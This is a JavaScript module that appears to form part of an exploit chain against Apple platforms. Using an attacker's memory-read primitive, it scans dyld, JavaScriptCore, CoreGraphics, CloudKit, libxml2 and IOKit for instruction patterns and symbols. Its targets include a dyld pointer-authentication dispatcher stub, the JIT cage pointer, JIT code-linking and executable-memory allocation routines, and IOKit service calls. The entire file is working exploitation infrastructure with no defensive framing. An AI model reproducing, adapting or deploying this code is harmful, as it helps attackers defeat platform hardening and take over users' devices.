export function createSeedbellTargets({ reader, context, MachOImage, log = () => {} }) {
const toBigInt = BigInt;
const stripPointerTag = (value) => value & 0x7fffffffffn;

function memory() {
    return reader;
}

const RESYNC_ALLOCATE_PATTERN = [
    3573752703, 2847821812, 2835446781, 2432713725, 2852127731,
    2953777224, 4181814536, 2852193248, 3594455327, 2852127732,
    3036676224, 2953777224, 4181816584, 3594455327, 4177529460,
    2839641085, 2831306740, 3596554239
];

const HTTP_FINALIZE_PATTERN = [
    3573752703, 2847821812, 2835446781, 2432713725, 2852127731,
    4181729288, 3019899016, 4181726817, 2853372896, 3594455327
];

const AUTOHINTER_BEGIN_PATTERN = [
    3019899074, 4181723203, 3019899011, 4181722176, 4181727298,
    3592358015, 3596551104
];

const AUTOHINTER_END_PATTERN = [
    3019899073, 4181725218, 3019899010, 4181722144, 4181727265,
    3592357983, 3596551104
];

const CLOUDKIT_PATTERN = [
    3573752703, 2847694840, 2835437558, 2835501044, 2835577853,
    2432746493, 2852324339, 2852258804, 2852127733, 1384120855,
    1384120832, 1386079969, 1923956161, 2500362746, 2852127734,
    2853503968, 2853569506, 2483610898, 4177527447, 2955245744,
    4182113808, 3670090736, 4177527408, 2853569504, 2839772157,
    2839695348, 2839631862, 2831441912, 3596554239
];

const CORE_MEDIA_RELEASE_PATTERN = [
    3573752703, 2847821812, 2835446781, 2432713725, 2852193267,
    2852127732, 4181722153, 4181723432, 3019899016, 4181721376,
    4181721697, 3594455327, 2853438432, 2853372897, 2839641085,
    2831306740, 3573752831, 3390965712, 3069182032, 3560476192,
    335894792
];

const DYLD_DISPATCHER_PATTERN = [
    3573752703, 2847898621, 2432697341, 4181721097, 3069706633,
    3547382056, 3546332451, 3547449636, 2852258784, 2852652002,
    2831252477, 3573752831, 3390965712, 3069182032, 3560476192
];

const DYLD_PAC_STUB_PATTERN = [
    2852127729, 2852652016, 3573752095, 335544332,
    2852127729, 2852652016, 3670084113, 335544328,
    2852127729, 2852652016, 3573752159, 335544324,
    2852127729, 2852652016, 3670085137, 2853241824, 3596551104
];

const DLFNC_GLOBAL_LOOKUP_PATTERN = [
    3573752703, 2847821812, 2835446781, 2432713725, 2852127731,
    3531603968, 1384120353, 2483792040, 3019899136, 2852127732,
    2853372897, 2487440593, 2852127731, 2853438432, 2483792025,
    2853372896, 2839641085, 2831306740, 3596554239
];

class SeedbellTargets {
    constructor(context) {
        this.context = context;
        this.cache = new Map();
    }

    resolve(name, resolver) {
        if (!this.cache.has(name)) {
            log("[TARGET] resolving " + name);
            this.cache.set(name, resolver());
            log("[TARGET] resolved " + name);
        }
        return this.cache.get(name);
    }

    findObjCStringSlot(image, segmentName, expected, returnSlot) {
        const objcReadOnly = this.context.image("/usr/lib/libobjc.A.dylib").segment("__OBJC_RO");
        if (objcReadOnly === null) throw new Error("libobjc __OBJC_RO segment is missing");
        const segment = image.segment(segmentName);
        if (segment === null) throw new Error(image.baseAddress.toString(16) + " " + segmentName + " is missing");

        const end = segment.address + segment.vmSize;
        for (let slot = segment.address; slot < end; slot += 8n) {
            const stringAddress = memory().read64(slot);
            if (
                stringAddress >= objcReadOnly.address &&
                stringAddress < objcReadOnly.address + objcReadOnly.vmSize &&
                memory().readString(stringAddress, expected.length + 48) === expected
            ) {
                return returnSlot ? slot : stringAddress;
            }
        }
        throw new Error("Objective-C string was not found: " + expected);
    }

    get xmlSaxPublicIdPointer() {
        return this.resolve("xmlSaxPublicIdPointer", () => {
            const image = this.context.image("libxml2.2.dylib");
            return this.context.scanner.findExportPointer({
                symbol: "_xmlSAX2GetPublicId",
                exportingImage: image,
                pointerImage: image
            });
        });
    }

    get resyncAllocatePayloadPointer() {
        return this.resolve("resyncAllocatePayloadPointer", () => {
            const image = this.context.image(
                "/System/Library/PrivateFrameworks/RESync.framework/RESync",
                "/System/Library/PrivateFrameworks/RESync.framework/Versions/A/RESync"
            );
            return this.context.scanner.findCodePointer({
                image,
                pattern: RESYNC_ALLOCATE_PATTERN
            });
        });
    }

    get resyncGlobalSlotA() {
        return this.resolve("resyncGlobalSlotA", () => {
            const slots = this.context.scanner.adrpLdrTargetsUntilReturn(
                stripPointerTag(this.resyncAllocatePayloadPointer),
                560
            );
            if (slots.length !== 2) throw new Error("RESync global slot count changed");
            return slots[0];
        });
    }

    get resyncGlobalSlotB() {
        return this.resolve("resyncGlobalSlotB", () => {
            const slots = this.context.scanner.adrpLdrTargetsUntilReturn(
                stripPointerTag(this.resyncAllocatePayloadPointer),
                560
            );
            if (slots.length !== 2) throw new Error("RESync global slot count changed");
            return slots[1];
        });
    }

    get httpFinalizePointer() {
        return this.resolve("httpFinalizePointer", () =>
            this.context.scanner.findCodePointer({
                image: this.context.image(
                    "/System/Library/PrivateFrameworks/CoreUtils.framework/CoreUtils"
                ),
                pattern: HTTP_FINALIZE_PATTERN
            })
        );
    }

    get autohinterBeginPointer() {
        return this.resolve("autohinterBeginPointer", () =>
            this.context.scanner.findCodePointer({
                image: this.context.image(
                    "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics"
                ),
                pattern: AUTOHINTER_BEGIN_PATTERN
            })
        );
    }

    get autohinterEndPointer() {
        return this.resolve("autohinterEndPointer", () =>
            this.context.scanner.findCodePointer({
                image: this.context.image(
                    "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics"
                ),
                pattern: AUTOHINTER_END_PATTERN
            })
        );
    }

    get xmlHashScanFull() {
        return this.resolve("xmlHashScanFull", () =>
            this.context.image("libxml2.2.dylib").export("_xmlHashScanFull")
        );
    }

    get cloudKitFunction() {
        return this.resolve("cloudKitFunction", () =>
            this.context.scanner.findPattern(
                this.context.image("/System/Library/Frameworks/CloudKit.framework/CloudKit"),
                CLOUDKIT_PATTERN
            )
        );
    }

    get cloudKitGlobalSlot() {
        return this.resolve("cloudKitGlobalSlot", () => {
            const slots = this.context.scanner.adrpLdrTargetsUntilReturn(this.cloudKitFunction, 116);
            if (slots.length !== 1) throw new Error("CloudKit global slot count changed");
            return slots[0];
        });
    }

    get cloudKitBindingSelector() {
        return this.resolve("cloudKitBindingSelector", () =>
            this.findObjCStringSlot(
                this.context.image("/System/Library/Frameworks/CloudKit.framework/CloudKit"),
                "__DATA_CONST",
                "cksqlcs_blobBindingValue:destructor:error:",
                false
            )
        );
    }

    get uuidSelector() {
        return this.resolve("uuidSelector", () =>
            this.findObjCStringSlot(
                this.context.image("/System/Library/Frameworks/CloudKit.framework/CloudKit"),
                "__DATA_CONST",
                "UUID",
                false
            )
        );
    }

    get uiKitSecondAttributeSlot() {
        return this.resolve("uiKitSecondAttributeSlot", () =>
            this.findObjCStringSlot(
                this.context.image(
                    "/System/Library/PrivateFrameworks/UIKitCore.framework/UIKitCore"
                ),
                "__DATA_CONST",
                "secondAttribute",
                true
            )
        );
    }

    get uiKitSecondAttributeFunction() {
        return this.resolve("uiKitSecondAttributeFunction", () => {
            const image = this.context.image(
                "/System/Library/PrivateFrameworks/UIKitCore.framework/UIKitCore"
            );
            return this.context.scanner.findPointerToValidatedFunction(
                image,
                image,
                "secondAttribute"
            );
        });
    }

    get nsuuidClass() {
        return this.resolve("nsuuidClass", () => {
            const value = this.context
                .image("/System/Library/Frameworks/Foundation.framework/Foundation")
                .export("_OBJC_CLASS_$_NSUUID");
            if (value === null) throw new Error("NSUUID class export is missing");
            return value;
        });
    }

    get coreMediaReleasePointer() {
        return this.resolve("coreMediaReleasePointer", () =>
            this.context.scanner.findCodePointer({
                image: this.context.image(
                    "/System/Library/Frameworks/CoreMedia.framework/CoreMedia"
                ),
                pattern: CORE_MEDIA_RELEASE_PATTERN
            })
        );
    }

    get dyldImage() {
        return this.resolve("dyldImage", () => {
            const dataDirty = this.context.image("libdyld.dylib").segment("__DATA_DIRTY");
            if (dataDirty === null) throw new Error("libdyld __DATA_DIRTY is missing");
            const dyld4 = dataDirty.section("__dyld4");
            if (dyld4 === null) throw new Error("libdyld __dyld4 is missing");
            const first = memory().read64(dyld4.address + 8n);
            const second = memory().read64(stripPointerTag(first));
            const third = memory().read64(stripPointerTag(second));
            return MachOImage.findFromAddress(stripPointerTag(third));
        });
    }

    get pacDispatcher() {
        return this.resolve("pacDispatcher", () => {
            const scanner = this.context.scanner;
            const dyld = this.dyldImage;
            const pending = [null];
            let dispatcher = null;

            while (pending.length > 0) {
                const candidate = scanner.findPattern(dyld, DYLD_DISPATCHER_PATTERN, pending.pop());
                if (candidate === null) continue;
                pending.push(candidate + 4n);
                const branches = scanner.branchTargets(
                    candidate,
                    4 * DYLD_DISPATCHER_PATTERN.length + 12
                );
                if (branches.length !== 2) continue;
                if (scanner.findPatternNear(branches[0], DYLD_PAC_STUB_PATTERN, 256) !== null) {
                    dispatcher = candidate;
                    break;
                }
            }

            if (dispatcher === null) throw new Error("dyld PAC dispatcher was not found");

            let pacStub = null;
            for (;;) {
                pacStub = scanner.findPattern(dyld, DYLD_PAC_STUB_PATTERN, pacStub);
                if (pacStub === null) throw new Error("dyld PAC stub was not found");
                if (pacStub !== dispatcher) break;
                pacStub += toBigInt(4 * DYLD_PAC_STUB_PATTERN.length);
            }
            return pacStub - 0x40n;
        });
    }

    get dlfcnGlobalLookupPointer() {
        return this.resolve("dlfcnGlobalLookupPointer", () =>
            this.context.scanner.findCodePointer({
                image: this.context.image(
                    "/System/Library/PrivateFrameworks/ActionKit.framework/ActionKit"
                ),
                pattern: DLFNC_GLOBAL_LOOKUP_PATTERN
            })
        );
    }

    get javaScriptCore() {
        return this.resolve("javaScriptCore", () =>
            this.context.image("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore")
        );
    }

    get jitCagePointerSlot() {
        return this.resolve("jitCagePointerSlot", () => this.javaScriptCore.export("_jitCagePtr"));
    }

    get xmlMallocFunction() {
        return this.resolve("xmlMallocFunction", () => {
            const slot = this.context.image("/usr/lib/libxml2.2.dylib").export("_xmlMalloc");
            if (slot === null) throw new Error("xmlMalloc export is missing");
            return memory().read64(slot);
        });
    }

    get jscLinkCode() {
        return this.resolve("jscLinkCode", () =>
            this.javaScriptCore.export(
                "__ZN3JSC10LinkBuffer8linkCodeERNS_14MacroAssemblerENS_20JITCompilationEffortE"
            )
        );
    }

    get platformMemset() {
        return this.resolve("platformMemset", () =>
            this.context
                .image("/usr/lib/system/libsystem_platform.dylib")
                .export("__platform_memset")
        );
    }

    get platformMemmove() {
        return this.resolve("platformMemmove", () =>
            this.context
                .image("/usr/lib/system/libsystem_platform.dylib")
                .export("__platform_memmove")
        );
    }

    get malloc() {
        return this.resolve("malloc", () =>
            this.context.image("/usr/lib/system/libsystem_malloc.dylib").export("_malloc")
        );
    }

    get free() {
        return this.resolve("free", () =>
            this.context.image("/usr/lib/system/libsystem_malloc.dylib").export("_free")
        );
    }

    get fastMalloc() {
        return this.resolve("fastMalloc", () => this.javaScriptCore.export("__ZN3WTF10fastMallocEm"));
    }

    get metaAllocatorAllocate() {
        return this.resolve("metaAllocatorAllocate", () => {
            const candidates = [
                "__ZN3WTF13MetaAllocator8allocateEmPv",
                "__ZN3WTF13MetaAllocator8allocateERKNS_6LockerINS_4LockEEEm"
            ];
            for (const symbol of candidates) {
                const address = this.javaScriptCore.export(symbol);
                if (address !== null) return { address, symbol };
            }
            throw new Error("WTF::MetaAllocator::allocate export is missing");
        });
    }

    get executableMemoryCreateImpl() {
        return this.resolve("executableMemoryCreateImpl", () =>
            this.javaScriptCore.export("__ZN3JSC22ExecutableMemoryHandle10createImplEm")
        );
    }

    get secureHashPinAllocate() {
        return this.resolve("secureHashPinAllocate", () =>
            this.javaScriptCore.export(
                "__ZN3JSC20SecureARM64EHashPins27allocatePinForCurrentThreadEv"
            )
        );
    }

    get ioKit() {
        return this.resolve("ioKit", () =>
            this.context.image("IOKit.framework")
        );
    }

    get ioMainPort() {
        return this.resolve("ioMainPort", () => this.ioKit.export("_IOMainPort"));
    }

    get ioServiceMatching() {
        return this.resolve("ioServiceMatching", () =>
            this.ioKit.export("_IOServiceMatching")
        );
    }

    get ioServiceGetMatchingService() {
        return this.resolve("ioServiceGetMatchingService", () =>
            this.ioKit.export("_IOServiceGetMatchingService")
        );
    }

    get ioObjectRelease() {
        return this.resolve("ioObjectRelease", () => this.ioKit.export("_IOObjectRelease"));
    }

    get bootstrapPortSlot() {
        return this.resolve("bootstrapPortSlot", () =>
            this.context
                .image("/usr/lib/system/libsystem_kernel.dylib")
                .export("_bootstrap_port")
        );
    }
}

return new SeedbellTargets(context);
}
